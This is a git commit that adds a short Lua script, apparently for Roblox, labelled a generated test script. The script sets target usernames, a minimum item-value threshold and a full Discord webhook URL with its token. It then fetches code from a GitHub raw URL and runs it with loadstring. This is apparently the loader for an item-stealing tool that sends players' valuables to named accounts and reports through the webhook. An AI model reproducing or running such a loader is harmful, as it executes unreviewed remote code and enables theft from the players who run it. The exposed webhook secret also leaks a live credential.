9fc4707b15752fa5f8a49079816616780822eca5
214Eli <busterbishop22@icloud.com>
2025-02-21 19:55:08 +0800

    Generated script for test

---
+++ scripts/test-4379cf10.lua
@@ -0,0 +1,6 @@
+Username = "test"
+Username2 = "test"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1342098576461004802/cTli-_oxMr0QZmIiv6grA2TseAurAi5U_NGiKwV_nuCW-UiPCQZjVGb6gngWbnIiCVPI"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/214scripts/refs/heads/main/214scripts", true))()
